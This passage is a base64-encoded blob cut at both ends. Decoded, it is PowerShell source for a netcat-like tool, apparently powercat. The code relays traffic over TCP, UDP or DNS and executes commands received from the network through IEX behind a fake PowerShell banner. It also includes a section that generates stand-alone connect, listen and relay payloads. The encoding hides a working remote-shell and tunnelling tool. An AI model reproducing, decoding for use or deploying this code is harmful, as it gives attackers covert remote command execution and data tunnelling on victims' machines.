CeXRlc1JlYWQgLWVxIDApe2JyZWFrfQ0KICAgICAgJERhdGEgKz0gJEZ1bmNWYXJzWyJTdGRPdXREZXN0aW5hdGlvbkJ1ZmZlciJdWzAuLihbaW50XSRTdGRPdXRCeXRlc1JlYWQtMSldDQogICAgICAkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RkT3V0RGVzdGluYXRpb25CdWZmZXIiXSwgMCwgNjU1MzYsICRudWxsLCAkbnVsbCkNCiAgICB9DQogICAgaWYoJEZ1bmNWYXJzWyJTdGRFcnJSZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpDQogICAgew0KICAgICAgJFN0ZEVyckJ5dGVzUmVhZCA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkRXJyb3IuQmFzZVN0cmVhbS5FbmRSZWFkKCRGdW5jVmFyc1siU3RkRXJyUmVhZE9wZXJhdGlvbiJdKQ0KICAgICAgaWYoJFN0ZEVyckJ5dGVzUmVhZCAtZXEgMCl7YnJlYWt9DQogICAgICAkRGF0YSArPSAkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl1bMC4uKFtpbnRdJFN0ZEVyckJ5dGVzUmVhZC0xKV0NCiAgICAgICRGdW5jVmFyc1siU3RkRXJyUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRFcnJvci5CYXNlU3RyZWFtLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl0sIDAsIDY1NTM2LCAkbnVsbCwgJG51bGwpDQogICAgfQ0KICAgIHJldHVybiAkRGF0YSwkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBXcml0ZURhdGFfQ01EDQogIHsNCiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpDQogICAgJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRJbnB1dC5Xcml0ZUxpbmUoJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSkuVHJpbUVuZCgiYHIiKS5UcmltRW5kKCJgbiIpKQ0KICAgIHJldHVybiAkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBDbG9zZV9DTUQNCiAgew0KICAgIHBhcmFtKCRGdW5jVmFycykNCiAgICAkRnVuY1ZhcnNbIlByb2Nlc3MiXSB8IFN0b3AtUHJvY2Vzcw0KICB9ICANCiAgIyMjIyMjIyMjIyBDTUQgRlVOQ1RJT05TICMjIyMjIyMjIyMNCiAgDQogICMjIyMjIyMjIyMgUE9XRVJTSEVMTCBGVU5DVElPTlMgIyMjIyMjIyMjIw0KICBmdW5jdGlvbiBNYWluX1Bvd2Vyc2hlbGwNCiAgew0KICAgIHBhcmFtKCRTdHJlYW0xU2V0dXBWYXJzKSAgIA0KICAgIHRyeQ0KICAgIHsNCiAgICAgICRlbmNvZGluZyA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZw0KICAgICAgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gQCgpDQogICAgICBpZigkaSAtbmUgJG51bGwpDQogICAgICB7DQogICAgICAgIFdyaXRlLVZlcmJvc2UgIklucHV0IGZyb20gLWkgZGV0ZWN0ZWQuLi4iDQogICAgICAgIGlmKFRlc3QtUGF0aCAkaSl7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9IChbaW8uZmlsZV06OlJlYWRBbGxCeXRlcygkaSkpIH0NCiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiQnl0ZVtdIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRpIH0NCiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRFbmNvZGluZy5HZXRCeXRlcygkaSkgfQ0KICAgICAgICBlbHNle1dyaXRlLUhvc3QgIlVucmVjb2duaXNlZCBpbnB1dCB0eXBlLiIgOyByZXR1cm59DQogICAgICB9DQogICAgDQogICAgICBXcml0ZS1WZXJib3NlICJTZXR0aW5nIHVwIFN0cmVhbSAxLi4uIChFU0MvQ1RSTCB0byBleGl0KSINCiAgICAgIHRyeXskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1NldHVwICRTdHJlYW0xU2V0dXBWYXJzfQ0KICAgICAgY2F0Y2h7V3JpdGUtVmVyYm9zZSAiU3RyZWFtIDEgU2V0dXAgRmFpbHVyZSIgOyBicmVha30NCiAgICAgIA0KICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0dGluZyB1cCBTdHJlYW0gMi4uLiAoRVNDL0NUUkwgdG8gZXhpdCkiDQogICAgICB0cnkNCiAgICAgIHsNCiAgICAgICAgJEludHJvUHJvbXB0ID0gJEVuY29kaW5nLkdldEJ5dGVzKCJXaW5kb3dzIFBvd2VyU2hlbGxgbkNvcHlyaWdodCAoQykgMjAxMyBNaWNyb3NvZnQgQ29ycG9yYXRpb24uIEFsbCByaWdodHMgcmVzZXJ2ZWQuYG5gbiIgKyAoIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIikpDQogICAgICAgICRQcm9tcHQgPSAoIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIikNCiAgICAgICAgJENvbW1hbmRUb0V4ZWN1dGUgPSAiIiAgICAgIA0KICAgICAgICAkRGF0YSA9ICRudWxsDQogICAgICB9DQogICAgICBjYXRjaA0KICAgICAgew0KICAgICAgICBXcml0ZS1WZXJib3NlICJTdHJlYW0gMiBTZXR1cCBGYWlsdXJlIiA7IGJyZWFrDQogICAgICB9DQogICAgICANCiAgICAgIGlmKCRJbnB1dFRvV3JpdGUgLW5lIEAoKSkNCiAgICAgIHsNCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiV3JpdGluZyBpbnB1dCB0byBTdHJlYW0gMS4uLiINCiAgICAgICAgdHJ5eyRTdHJlYW0xVmFycyA9IFN0cmVhbTFfV3JpdGVEYXRhICRJbnB1dFRvV3JpdGUgJFN0cmVhbTFWYXJzfQ0KICAgICAgICBjYXRjaHtXcml0ZS1Ib3N0ICJGYWlsZWQgdG8gd3JpdGUgaW5wdXQgdG8gU3RyZWFtIDEiIDsgYnJlYWt9DQogICAgICB9DQogICAgICANCiAgICAgIGlmKCRkKXtXcml0ZS1WZXJib3NlICItZCAoZGlzY29ubmVjdCkgQWN0aXZhdGVkLiBEaXNjb25uZWN0aW5nLi4uIiA7IGJyZWFrfQ0KICAgICAgDQogICAgICBXcml0ZS1WZXJib3NlICJCb3RoIENvbW11bmljYXRpb24gU3RyZWFtcyBFc3RhYmxpc2hlZC4gUmVkaXJlY3RpbmcgRGF0YSBCZXR3ZWVuIFN0cmVhbXMuLi4iDQogICAgICB3aGlsZSgkVHJ1ZSkNCiAgICAgIHsgICAgICAgIA0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICMjIyMjIFN0cmVhbTIgUmVhZCAjIyMjIw0KICAgICAgICAgICRQcm9tcHQgPSAkbnVsbA0KICAgICAgICAgICRSZXR1cm5lZERhdGEgPSAkbnVsbA0KICAgICAgICAgIGlmKCRDb21tYW5kVG9FeGVjdXRlIC1uZSAiIikNCiAgICAgICAgICB7DQogICAgICAgICAgICB0cnl7W2J5dGVbXV0kUmV0dXJuZWREYXRhID0gJEVuY29kaW5nLkdldEJ5dGVzKChJRVggJENvbW1hbmRUb0V4ZWN1dGUgMj4mMSB8IE91dC1TdHJpbmcpKX0NCiAgICAgICAgICAgIGNhdGNoe1tieXRlW11dJFJldHVybmVkRGF0YSA9ICRFbmNvZGluZy5HZXRCeXRlcygoJF8gfCBPdXQtU3RyaW5nKSl9DQogICAgICAgICAgICAkUHJvbXB0ID0gJEVuY29kaW5nLkdldEJ5dGVzKCgiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKSkNCiAgICAgICAgICB9DQogICAgICAgICAgJERhdGEgKz0gJEludHJvUHJvbXB0DQogICAgICAgICAgJEludHJvUHJvbXB0ID0gJG51bGwNCiAgICAgICAgICAkRGF0YSArPSAkUmV0dXJuZWREYXRhDQogICAgICAgICAgJERhdGEgKz0gJFByb21wdA0KICAgICAgICAgICRDb21tYW5kVG9FeGVjdXRlID0gIiINCiAgICAgICAgICAjIyMjIyBTdHJlYW0yIFJlYWQgIyMjIyMNCg0KICAgICAgICAgIGlmKCREYXRhIC1uZSAkbnVsbCl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9Xcml0ZURhdGEgJERhdGEgJFN0cmVhbTFWYXJzfQ0KICAgICAgICAgICREYXRhID0gJG51bGwNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaA0KICAgICAgICB7DQogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMiB0byBTdHJlYW0gMSIgOyBicmVhaw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICREYXRhLCRTdHJlYW0xVmFycyA9IFN0cmVhbTFfUmVhZERhdGEgJFN0cmVhbTFWYXJzDQogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskQ29tbWFuZFRvRXhlY3V0ZSA9ICRFbmNvZGluZy5HZXRTdHJpbmcoJERhdGEpfQ0KICAgICAgICAgICREYXRhID0gJG51bGwNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaA0KICAgICAgICB7DQogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMSB0byBTdHJlYW0gMiIgOyBicmVhaw0KICAgICAgICB9DQogICAgICB9DQogICAgfQ0KICAgIGZpbmFsbHkNCiAgICB7DQogICAgICB0cnkNCiAgICAgIHsNCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2xvc2luZyBTdHJlYW0gMS4uLiINCiAgICAgICAgU3RyZWFtMV9DbG9zZSAkU3RyZWFtMVZhcnMNCiAgICAgIH0NCiAgICAgIGNhdGNoDQogICAgICB7DQogICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byBjbG9zZSBTdHJlYW0gMSINCiAgICAgIH0NCiAgICB9DQogIH0NCiAgIyMjIyMjIyMjIyBQT1dFUlNIRUxMIEZVTkNUSU9OUyAjIyMjIyMjIyMjDQoNCiAgIyMjIyMjIyMjIyBDT05TT0xFIEZVTkNUSU9OUyAjIyMjIyMjIyMjDQogIGZ1bmN0aW9uIFNldHVwX0NvbnNvbGUNCiAgew0KICAgIHBhcmFtKCRGdW5jU2V0dXBWYXJzKQ0KICAgICRGdW5jVmFycyA9IEB7fQ0KICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZw0KICAgICRGdW5jVmFyc1siT3V0cHV0Il0gPSAkRnVuY1NldHVwVmFyc1swXQ0KICAgICRGdW5jVmFyc1siT3V0cHV0Qnl0ZXMiXSA9IFtieXRlW11dQCgpDQogICAgJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSA9ICIiDQogICAgcmV0dXJuICRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFJlYWREYXRhX0NvbnNvbGUNCiAgew0KICAgIHBhcmFtKCRGdW5jVmFycykNCiAgICAkRGF0YSA9ICRudWxsDQogICAgaWYoJEhvc3QuVUkuUmF3VUkuS2V5QXZhaWxhYmxlKQ0KICAgIHsNCiAgICAgICREYXRhID0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldEJ5dGVzKChSZWFkLUhvc3QpICsgImBuIikNCiAgICB9DQogICAgcmV0dXJuICREYXRhLCRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9Db25zb2xlDQogIHsNCiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpDQogICAgc3dpdGNoKCRGdW5jVmFyc1siT3V0cHV0Il0pDQogICAgew0KICAgICAgIkhvc3QiIHtXcml0ZS1Ib3N0IC1uICRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRTdHJpbmcoJERhdGEpfQ0KICAgICAgIlN0cmluZyIgeyRGdW5jVmFyc1siT3V0cHV0U3RyaW5nIl0gKz0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSl9DQogICAgICAiQnl0ZXMiIHskRnVuY1ZhcnNbIk91dHB1dEJ5dGVzIl0gKz0gJERhdGF9DQogICAgfQ0KICAgIHJldHVybiAkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBDbG9zZV9Db25zb2xlDQogIHsNCiAgICBwYXJhbSgkRnVuY1ZhcnMpDQogICAgaWYoJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSAtbmUgIiIpe3JldHVybiAkRnVuY1ZhcnNbIk91dHB1dFN0cmluZyJdfQ0KICAgIGVsc2VpZigkRnVuY1ZhcnNbIk91dHB1dEJ5dGVzIl0gLW5lIEAoKSl7cmV0dXJuICRGdW5jVmFyc1siT3V0cHV0Qnl0ZXMiXX0NCiAgICByZXR1cm4NCiAgfQ0KICAjIyMjIyMjIyMjIENPTlNPTEUgRlVOQ1RJT05TICMjIyMjIyMjIyMNCiAgDQogICMjIyMjIyMjIyMgTUFJTiBGVU5DVElPTiAjIyMjIyMjIyMjDQogIGZ1bmN0aW9uIE1haW4NCiAgew0KICAgIHBhcmFtKCRTdHJlYW0xU2V0dXBWYXJzLCRTdHJlYW0yU2V0dXBWYXJzKQ0KICAgIHRyeQ0KICAgIHsNCiAgICAgIFtieXRlW11dJElucHV0VG9Xcml0ZSA9IEAoKQ0KICAgICAgJEVuY29kaW5nID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nDQogICAgICBpZigkaSAtbmUgJG51bGwpDQogICAgICB7DQogICAgICAgIFdyaXRlLVZlcmJvc2UgIklucHV0IGZyb20gLWkgZGV0ZWN0ZWQuLi4iDQogICAgICAgIGlmKFRlc3QtUGF0aCAkaSl7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9IChbaW8uZmlsZV06OlJlYWRBbGxCeXRlcygkaSkpIH0NCiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiQnl0ZVtdIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRpIH0NCiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRFbmNvZGluZy5HZXRCeXRlcygkaSkgfQ0KICAgICAgICBlbHNle1dyaXRlLUhvc3QgIlVucmVjb2duaXNlZCBpbnB1dCB0eXBlLiIgOyByZXR1cm59DQogICAgICB9DQogICAgICANCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldHRpbmcgdXAgU3RyZWFtIDEuLi4iDQogICAgICB0cnl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9TZXR1cCAkU3RyZWFtMVNldHVwVmFyc30NCiAgICAgIGNhdGNoe1dyaXRlLVZlcmJvc2UgIlN0cmVhbSAxIFNldHVwIEZhaWx1cmUiIDsgYnJlYWt9DQogICAgICANCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldHRpbmcgdXAgU3RyZWFtIDIuLi4iDQogICAgICB0cnl7JFN0cmVhbTJWYXJzID0gU3RyZWFtMl9TZXR1cCAkU3RyZWFtMlNldHVwVmFyc30NCiAgICAgIGNhdGNoe1dyaXRlLVZlcmJvc2UgIlN0cmVhbSAyIFNldHVwIEZhaWx1cmUiIDsgYnJlYWt9DQogICAgICANCiAgICAgICREYXRhID0gJG51bGwNCiAgICAgIA0KICAgICAgaWYoJElucHV0VG9Xcml0ZSAtbmUgQCgpKQ0KICAgICAgew0KICAgICAgICBXcml0ZS1WZXJib3NlICJXcml0aW5nIGlucHV0IHRvIFN0cmVhbSAxLi4uIg0KICAgICAgICB0cnl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9Xcml0ZURhdGEgJElucHV0VG9Xcml0ZSAkU3RyZWFtMVZhcnN9DQogICAgICAgIGNhdGNoe1dyaXRlLUhvc3QgIkZhaWxlZCB0byB3cml0ZSBpbnB1dCB0byBTdHJlYW0gMSIgOyBicmVha30NCiAgICAgIH0NCiAgICAgIA0KICAgICAgaWYoJGQpe1dyaXRlLVZlcmJvc2UgIi1kIChkaXNjb25uZWN0KSBBY3RpdmF0ZWQuIERpc2Nvbm5lY3RpbmcuLi4iIDsgYnJlYWt9DQogICAgICANCiAgICAgIFdyaXRlLVZlcmJvc2UgIkJvdGggQ29tbXVuaWNhdGlvbiBTdHJlYW1zIEVzdGFibGlzaGVkLiBSZWRpcmVjdGluZyBEYXRhIEJldHdlZW4gU3RyZWFtcy4uLiINCiAgICAgIHdoaWxlKCRUcnVlKQ0KICAgICAgew0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICREYXRhLCRTdHJlYW0yVmFycyA9IFN0cmVhbTJfUmVhZERhdGEgJFN0cmVhbTJWYXJzDQogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1dyaXRlRGF0YSAkRGF0YSAkU3RyZWFtMVZhcnN9DQogICAgICAgICAgJERhdGEgPSAkbnVsbA0KICAgICAgICB9DQogICAgICAgIGNhdGNoDQogICAgICAgIHsNCiAgICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gcmVkaXJlY3QgZGF0YSBmcm9tIFN0cmVhbSAyIHRvIFN0cmVhbSAxIiA7IGJyZWFrDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgJERhdGEsJFN0cmVhbTFWYXJzID0gU3RyZWFtMV9SZWFkRGF0YSAkU3RyZWFtMVZhcnMNCiAgICAgICAgICBpZigkRGF0YSAtbmUgJG51bGwpeyRTdHJlYW0yVmFycyA9IFN0cmVhbTJfV3JpdGVEYXRhICREYXRhICRTdHJlYW0yVmFyc30NCiAgICAgICAgICAkRGF0YSA9ICRudWxsDQogICAgICAgIH0NCiAgICAgICAgY2F0Y2gNCiAgICAgICAgew0KICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byByZWRpcmVjdCBkYXRhIGZyb20gU3RyZWFtIDEgdG8gU3RyZWFtIDIiIDsgYnJlYWsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgICBmaW5hbGx5DQogICAgew0KICAgICAgdHJ5DQogICAgICB7DQogICAgICAgICNXcml0ZS1WZXJib3NlICJDbG9zaW5nIFN0cmVhbSAyLi4uIg0KICAgICAgICBTdHJlYW0yX0Nsb3NlICRTdHJlYW0yVmFycw0KICAgICAgfQ0KICAgICAgY2F0Y2gNCiAgICAgIHsNCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIGNsb3NlIFN0cmVhbSAyIg0KICAgICAgfQ0KICAgICAgdHJ5DQogICAgICB7DQogICAgICAgICNXcml0ZS1WZXJib3NlICJDbG9zaW5nIFN0cmVhbSAxLi4uIg0KICAgICAgICBTdHJlYW0xX0Nsb3NlICRTdHJlYW0xVmFycw0KICAgICAgfQ0KICAgICAgY2F0Y2gNCiAgICAgIHsNCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIGNsb3NlIFN0cmVhbSAxIg0KICAgICAgfQ0KICAgIH0NCiAgfQ0KICAjIyMjIyMjIyMjIE1BSU4gRlVOQ1RJT04gIyMjIyMjIyMjIw0KICANCiAgIyMjIyMjIyMjIyBHRU5FUkFURSBQQVlMT0FEICMjIyMjIyMjIyMNCiAgaWYoJHUpDQogIHsNCiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDE6IFVEUCINCiAgICAkRnVuY3Rpb25TdHJpbmcgPSAoImZ1bmN0aW9uIFN0cmVhbTFfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX1VEUH0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfVURQfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1VEUH0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfVURQfSArICJgbn1gbmBuIikgICAgDQogICAgaWYoJGwpeyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCcnLGAkVHJ1ZSwnJHAnLCckdCcpICJ9DQogICAgZWxzZXskSW52b2tlU3RyaW5nID0gIk1haW4gQCgnJGMnLGAkRmFsc2UsJyRwJywnJHQnKSAifQ0KICB9DQogIGVsc2VpZigkZG5zIC1uZSAiIikNCiAgew0KICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMTogRE5TIg0KICAgICRGdW5jdGlvblN0cmluZyA9ICgiZnVuY3Rpb24gU3RyZWFtMV9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfRE5TfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9ETlN9ICsgImBufWBuYG4iKQ0KICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfRE5TfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9ETlN9ICsgImBufWBuYG4iKQ0KICAgIGlmKCRsKXtyZXR1cm4gIlRoaXMgZmVhdHVyZSBpcyBub3QgYXZhaWxhYmxlLiJ9DQogICAgZWxzZXskSW52b2tlU3RyaW5nID0gIk1haW4gQCgnJGMnLCckcCcsJyRkbnMnLCRkbnNmdCkgIn0NCiAgfQ0KICBlbHNlDQogIHsNCiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDE6IFRDUCINCiAgICAkRnVuY3Rpb25TdHJpbmcgPSAoImZ1bmN0aW9uIFN0cmVhbTFfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX1RDUH0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfVENQfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1RDUH0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfVENQfSArICJgbn1gbmBuIikNCiAgICBpZigkbCl7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJycsYCRUcnVlLCRwLCR0KSAifQ0KICAgIGVsc2V7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJyRjJyxgJEZhbHNlLCRwLCR0KSAifQ0KICB9DQogIA0KICBpZigkZSAtbmUgIiIpDQogIHsNCiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFByb2Nlc3MiDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfQ01EfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9DTUR9ICsgImBufWBuYG4iKQ0KICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfQ01EfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9DTUR9ICsgImBufWBuYG4iKQ0KICAgICRJbnZva2VTdHJpbmcgKz0gIkAoJyRlJylgbmBuIg0KICB9DQogIGVsc2VpZigkZXApDQogIHsNCiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFBvd2Vyc2hlbGwiDQogICAgJEludm9rZVN0cmluZyArPSAiYG5gbiINCiAgfQ0KICBlbHNlaWYoJHIgLW5lICIiKQ0KICB7DQogICAgaWYoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJ1ZHAiKQ0KICAgIHsNCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogVURQIg0KICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVURQfSArICJgbn1gbmBuIikNCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1VEUH0gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1VEUH0gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9VRFB9ICsgImBufWBuYG4iKSAgICANCiAgICAgIGlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpeyRJbnZva2VTdHJpbmcgKz0gKCJAKCcnLGAkVHJ1ZSwnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJywnJHQnKSAiKX0NCiAgICAgIGVsc2VpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAzKXskSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJyxgJEZhbHNlLCciICsgJHIuc3BsaXQoIjoiKVsyXSArICInLCckdCcpICIpfQ0KICAgICAgZWxzZXtyZXR1cm4gIkJhZCByZWxheSBmb3JtYXQuIn0NCiAgICB9DQogICAgaWYoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJkbnMiKQ0KICAgIHsNCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogRE5TIg0KICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfRE5TfSArICJgbn1gbmBuIikNCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX0ROU30gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX0ROU30gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9ETlN9ICsgImBufWBuYG4iKQ0KICAgICAgaWYoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMil7cmV0dXJuICJUaGlzIGZlYXR1cmUgaXMgbm90IGF2YWlsYWJsZS4ifQ0KICAgICAgZWxzZWlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDQpeyRJbnZva2VTdHJpbmcgKz0gKCJAKCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLCciICsgJHIuc3BsaXQoIjoiKVsyXSArICInLCciICsgJHIuc3BsaXQoIjoiKVszXSArICInLCRkbnNmdCkgIil9DQogICAgICBlbHNle3JldHVybiAiQmFkI